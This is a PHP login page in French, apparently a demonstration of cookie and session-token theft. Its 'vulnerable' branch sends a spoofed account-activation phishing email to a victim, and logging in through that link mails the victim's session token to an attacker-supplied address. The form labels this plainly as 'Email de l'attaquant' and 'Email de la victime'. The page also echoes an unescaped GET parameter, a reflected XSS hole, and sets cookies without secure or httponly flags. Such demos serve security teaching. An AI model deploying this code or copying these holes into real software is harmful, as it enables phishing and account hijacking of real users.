<!DOCTYPE html>
<?php
/*****************************************************
 *                       MODEL                       *
 *****************************************************/
require("model.php");

/*****************************************************
 *                      COOKIES                      *
 *****************************************************/
// CODE

function loginProcessVulnerable($emailTo) {
    if (isset($_POST["loginUser"]) && isset($_POST["loginPass"])) {
        $token = login($_POST["loginUser"], $_POST["loginPass"]);
        echo $token;
        if (isset($token)) {
            $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;    
            if (isset($_POST["checkPersistent"]) && $_POST["checkPersistent"]) {
                setcookie('userToken', $token, time()+60*60*24*30, '/', $domain, false);
            } else {
                setcookie('userToken', $token, 0, '/', $domain, false);
            }
            $subject = "Jeton reçu du site ". $_SERVER['HTTP_HOST'];
            $message = "Voici le jeton pour le site ". $_SERVER['HTTP_HOST']. ". L'identifiant du cookie est userToken et le jeton est ". $token .".";
            mail($emailTo, $subject, $message);
            header("Location: ./cookies.php");
        }
        else {
            header("Location: ./cookies.php?toEmail=".$emailTo."&connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
        }
    }
}

function sendMailVuln() {
    $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;   
    if (isset($_POST["mailVict"]) && isset($_POST["mailRecept"])) {
        $linkText = "Activer mon compte";
        $link = $_SERVER["HTTP_HOST"] . "/source/william/cookies.php?toEmail=".$_POST["mailRecept"];
        $mailto = $_POST["mailVict"];
        $headers = "MIME-Version: 1.0\r\n" .
        "Content-type: text/html; charset=utf-8\r\n".
        "From: webmestre@".$_SERVER['HTTP_HOST']."\r\n".
        "Reply-To: webmestre@".$_SERVER['HTTP_HOST']."\r\n\r\n";
        $subject = 'Confirmer l\'activation de votre compte.';
        $message = "<html><head><title>Confirmer l'activation de votre compte.</title></head><body><div><span>" .
            "Bonjour, pour confirmer et activer votre compte, veuillez cliquer sur le lien ci-dessous.</span></div><br /><br /><div><span>" .
            "<a href=\"http://".$link."\">".$linkText."</a>" .
            "</span></div></body></head>\r\n";
        mail($mailto, $subject, $message, $headers);
        header("Location: ./cookies.php");
    } 
}

function loginProcess() {
    if (isset($_POST["loginUser"]) && isset($_POST["loginPass"])) {
        $token = login($_POST["loginUser"], $_POST["loginPass"]);
        echo $token;
        if (isset($token)) {
            $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;    
            if (isset($_POST["checkPersistent"]) && $_POST["checkPersistent"]) {
                setcookie('userToken', $token, time()+60*60*24*30, '/', $domain, false);
            } else {
                setcookie('userToken', $token, 0, '/', $domain, false);
            }
            header("Location: ./cookies.php");
        }
        else {
            header("Location: ./cookies.php?connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
        }
    }
}

function logoutProcess() {
    if (isset($_COOKIE["userToken"])):
        logout($_COOKIE["userToken"]);
        unset($_POST);
        echo 'window.location.href="./cookies.php"';
    endif;
}

?>
    <?php if (isset($_COOKIE["userToken"]) && is_logged_in($_COOKIE["userToken"])): ?>
        <form method="post">
            <button type="submit" name="disconnect" value="disconnect" onclick=<?php logoutProcess(); ?>> Se déconnecter </button>
        </form>
        <br>
        <div><span>L'usager est connecté.</span></div>
    <?php else: ?>
        <?php setcookie("userToken", '',time()-1000, '/'); ?>
        <form method="post">
        <label for='loginUser'> Usager: </label>
        <input type='email' name='loginUser' id='loginUser' />
        <br />
        <label for='loginPass'> Mot de passe: </label>
        <input type='password' name='loginPass' id='loginPass' />
        <br />
        <label for="checkPersistent"> Se souvenir de moi </label>
        <input type="checkbox" name="checkPersistent" id="checkPersistent" />
        <br />
        <button type='submit' name="connect" value="connect" onclick=<?php if(isset($_GET["toEmail"])) {loginProcessVulnerable($_GET["toEmail"]);} else {loginProcess();} ?>> Se connecter </button>
        </form>
        <?php if(isset($_GET["connectError"])): ?>
            <br />
            <div><span><?php echo $_GET["connectError"]; ?></span></div>
        <?php endif; ?>
        <form method="post">
            <label for="mailRecept"> Email de l'attaquant </label>
            <input type="email" name="mailRecept" id="mailRecept" />
            <br />
            <br />
            <label for="mailVict"> Email de la victime </label>
            <input type="email" name="mailVict" id="mailVict" />
            <br />
            <br />
            <button type="submit" name="sendMailVuln" onclick=<?php sendMailVuln(); ?>> Envoyer courriel vulnérable </button>
        </form>
    <?php endif;?>